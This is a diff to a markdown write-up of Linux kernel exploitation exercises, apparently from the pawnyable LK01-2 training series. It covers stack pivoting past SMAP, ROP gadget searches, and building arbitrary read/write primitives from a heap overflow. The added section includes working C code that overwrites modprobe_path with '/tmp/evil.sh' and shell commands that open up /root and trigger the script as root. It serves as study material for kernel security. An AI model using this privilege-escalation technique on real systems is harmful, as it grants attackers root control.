@@ -326,12 +326,12 @@ Use the following gadget:
 0xffffffff815a9798: mov esp, 0x39000000; ret;
 ~~~
 
-See: src/03.stack_pivot
+See: [src/03.stack_pivot](https://github.com/cpey/pawnyable/tree/main/LK01-2/src/03.stack_pivot)
 
 # Bypassing SMAP: Stack Pivot to kernel heap
 
 Need to assign `rsp` a heap address we can write to. From the crash caused by
-`ioctl` (in src/02.control-rip/control-rip.c),
+`ioctl` (in [src/02.control-rip/control-rip.c](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/02.control-rip/control-rip.c)),
 
 ~~~c
   ioctl(spray[i], 0xdeadbeef, 0xcafebabe)
@@ -372,4 +372,100 @@ Instead we will use:
 ==> Found 3 gadgets in 1.503 seconds
 ~~~
 
-see: src/04.heapbof-krop/heapbof-krop.c
+See: [src/04.heapbof-krop/heapbof-krop.c](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/04.heapbof-krop/heapbof-krop.c)
+
+## Exploiting AAR/AAW
+
+When not possible to pivot the stack, being rdx and ecx controllable, you can
+write any 4-byte value to any address by calling this gadget:
+
+~~~sh
+$ ropr vmlinux --noisy --nosys --nojop -R "mov \[rdx\], rcx; ret;"
+...
+0xffffffff811b7dd6: mov [rdx], rcx; ret;
+~~~
+
+*Arbitary address writes (AAW)* primitives can be created in situations where RIP
+can be controlled.
+
+*Arbitrary address read (AAR)* can be created with:
+
+~~~sh
+$ ropr vmlinux --noisy --nosys --nojop -R "mov eax, \[rdx\]; ret;"
+...
+0xffffffff81440428: mov eax, [rdx]; ret;
+~~~
+
+### Attack vector
+
+When the filetype of the executable is unknown, the following call path is
+followed, which ends up invokin `/sbin/modprobe` and trying to load the binary
+as a kernel module:
+
+~~~
+- do_execveat_common()
+  - bprm_execve()
+    - __request_module()
+      - call_modprobe()    
+~~~
+
+Kernel code flow in [loading_kernel_module.md](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/05.heapbof-aaw/loading_kernel_module.md).
+
+The objective is to replace the string "/sbin/modprobe" with the attacker's shellcode.
+
+### Find address of string "/sbin/modprobe:
+
+Searching the "/sbin/modprobe" string:
+
+~~~sh
+$ python3
+>>> from ptrlib import ELF
+>>> kernel = ELF("./vmlinux")
+>>> hex(next(kernel.search("/sbin/modprobe\0")))
+'0xffffffff81e38180'
+~~~
+
+Checking with gdb:
+
+~~~gdb
+pwndbg> x/1s 0xffffffff81e38180
+0xffffffff81e38180:     "/sbin/modprobe"
+~~~
+
+### Using AAW
+
+Overwritting "/sbin/modprobe" with the shellscript path using AAW primitive:
+
+~~~c
+void AAW32(unsigned long addr, unsigned int val) {
+  unsigned long *p = (unsigned long*)&buf;
+  p[12] = rop_mov_prdx_rcx; 	// mov qword [rdx], rcx; ret;
+  *(unsigned long*)&buf[0x418] = g_buf;
+  write(fd, buf, 0x420);
+
+  // mov [rdx], rcx; ret;
+  for (int i = 0; i < 100; i++) {
+    ioctl(spray[i], val /* rcx */, addr /* rdx */);
+  }
+}
+
+int main() {
+...
+  char cmd[] = "/tmp/evil.sh";
+  for (int i = 0; i < sizeof(cmd); i += 4) {
+    AAW32(addr_modprobe_path + i, *(unsigned int*)&cmd[i]);
+  } 
+}
+~~~
+
+### Prepare and trigger the shell script
+
+~~~c
+system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/evil.sh");
+system("chmod +x /tmp/evil.sh");
+system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
+system("chmod +x /tmp/pwn");
+system("/tmp/pwn"); // call modprobe_path
+~~~
+
+See: [src/05.heapbof-aaw/heapbof-aaw.c](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/05.heapbof-aaw/heapbof-aaw.c)
